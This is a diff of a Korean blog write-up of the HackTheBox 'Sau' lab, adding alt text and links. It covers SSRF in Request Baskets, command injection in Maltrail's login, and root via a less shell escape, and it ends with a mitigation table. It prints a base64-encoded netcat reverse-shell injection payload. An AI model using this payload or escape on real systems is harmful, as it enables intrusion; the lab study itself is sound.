@@ -5,6 +5,7 @@ draft = false
 
 categories = ["HTB", "pentesting"]
 tags = ["HTB", "write-up", "SSRF", "Command Injection", "CVE", "Linux", "systemctl", "GTFOBins", "Maltrail"]
+description = "HackTheBox Sau 풀이 — Request Baskets의 SSRF(CVE-2023-27163)로 방화벽 뒤 내부 Maltrail에 접근하고, username 파라미터의 Command Injection으로 쉘을 얻은 뒤 sudo systemctl status의 less에서 GTFOBins 기법으로 root까지 상승한다."
 +++
 
 # HTB - Sau (Retired Machine)
@@ -124,13 +125,13 @@ PORT      STATE    SERVICE VERSION
 
 ### 웹 서비스 분석
 
-![](./images/web_landing_page.png)
+![55555 포트의 Request Baskets 서비스 랜딩 페이지와 버전 1.2.1](./images/web_landing_page.png)
 
 55555 포트에 접속하면 **Request Baskets** 서비스가 나타난다. 임의의 HTTP 요청을 수집하고 분석하는 서비스로, footer에서 **Version 1.2.1**을 확인할 수 있다.
 
 버전 정보가 확인됐으니 공개 exploit을 바로 조회한다.
 
-![](./images/CVE_search_result.png)
+![Request Baskets 1.2.1 CVE-2023-27163 SSRF 취약점 검색 결과](./images/CVE_search_result.png)
 
 **CVE-2023-27163** SSRF 취약점이 존재하는 것으로 확인된다.
 
@@ -142,17 +143,17 @@ PORT      STATE    SERVICE VERSION
 
 Request Baskets의 basket 설정에서 **Forward URL** 기능을 확인했다.
 
-![](./images/verify_SSRF.png)
+![basket의 Forward URL 설정을 내부 주소로 지정하는 화면](./images/verify_SSRF.png)
 
 basket을 하나 생성하고 Forward URL을 `http://127.0.0.1:80`으로 설정한다. nmap에서 `filtered`로 확인됐던 80번 포트다.
 
 basket URL로 요청을 보내면 서버가 내부 `127.0.0.1:80`으로 요청을 전달하고, 그 응답이 돌아온다.
 
-![](./images/maltrail_page.png)
+![SSRF로 접근한 내부 Maltrail v0.53 로그인 페이지](./images/maltrail_page.png)
 
 내부에서 **Maltrail v0.53**이 실행 중인 것을 확인했다. 버전이 식별됐으니 바로 CVE를 조회한다.
 
-![](./images/search_maltrail_cve.png)
+![Maltrail v0.53 Command Injection RCE 취약점 검색 결과](./images/search_maltrail_cve.png)
 
 Maltrail v0.53에 RCE 취약점이 존재하는 것으로 확인된다. `/login` 엔드포인트의 `username` 파라미터에 Command Injection이 가능하다.
 
@@ -160,11 +161,11 @@ Maltrail v0.53에 RCE 취약점이 존재하는 것으로 확인된다. `/login`
 
 Metasploit의 `unix/http/maltrail_rce` 모듈을 사용한다. SSRF를 경유해야 하기 때문에 RHOSTS에 basket URL을 지정한다.
 
-![](./images/metasploit_maltrail.png)
+![Metasploit maltrail_rce 모듈 옵션 설정 화면](./images/metasploit_maltrail.png)
 
 Burp로 실제 전송되는 payload를 확인하면 다음과 같다.
 
-![](./images/payload.png)
+![Burp로 가로챈 username 파라미터의 백틱 Command Injection 페이로드](./images/payload.png)
 
 ```
 username=;`echo "..." | base64 -d | sh;#`
@@ -172,7 +173,7 @@ username=;`echo "..." | base64 -d | sh;#`
 
 백틱으로 감싸서 큰따옴표 안에서도 Command Substitution이 동작하도록 한 구조다. 최종적으로 사용한 netcat 리버스 쉘 payload:
 
-![](./images/Pasted image 20260518133550.png)
+![base64 인코딩한 netcat 리버스 쉘 페이로드 전송](./images/Pasted image 20260518133550.png)
 
 ```
 username=;`echo+"bWtmaWZvIC90bXAva2RheDsgbmMgMTAuMTAuMTQuMTg4IDQ0NDQgMDwvdG1wL2tkYXggfCAvYmluL3NoID4vdG1wL2tkYXggMj4mMTsgcm0gL3RtcC9rZGF4"+|+base64+-d+|+sh;#`
@@ -215,7 +216,7 @@ User puma may run the following commands on sau:
 
 패스워드 없이 `systemctl status trail.service`를 root 권한으로 실행할 수 있다. GTFOBins에서 `systemctl`을 검색한다.
 
-![](./images/gtfobins_inherit.png)
+![GTFOBins의 systemctl Inherit 항목 설명](./images/gtfobins_inherit.png)
 
 **Inherit** 항목이 핵심이다. `systemctl status`는 출력이 길 경우 내부적으로 `less`를 호출하는데, `less`에서 `!sh`를 입력하면 less가 상속받은 root 권한 그대로 `/bin/sh`가 실행된다.
 
@@ -297,3 +298,11 @@ privesc에서 60분을 낭비한 이유는 GTFOBins에서 Inherit 항목을 제�
 | Maltrail username Command Injection | 입력값 검증, `shell=True` 대신 인자 리스트 방식 사용 |
 | sudo 권한 과다 부여 | 최소 권한 원칙, 위험 바이너리 sudo 허용 전 GTFOBins 검토 |
 | less에서 쉘 spawn | pager를 `PAGER=cat`으로 고정하거나 systemd 출력 리다이렉션 |
+
+---
+
+## 관련 글
+
+- [HTB - Sense](/posts/sense/) — 버전 식별 → 공개 CVE → Command Injection으로 이어지는 동일한 foothold 패턴.
+- [HTB - Vaccine](/posts/vaccine/) — `sudo -l`에서 발견한 바이너리를 GTFOBins로 권한 상승하는 같은 계열의 privesc(vi GTFOBin).
+- [HTB - Oopsie](/posts/oopsie/) — username/입력 파라미터를 통한 Command Injection 변형.
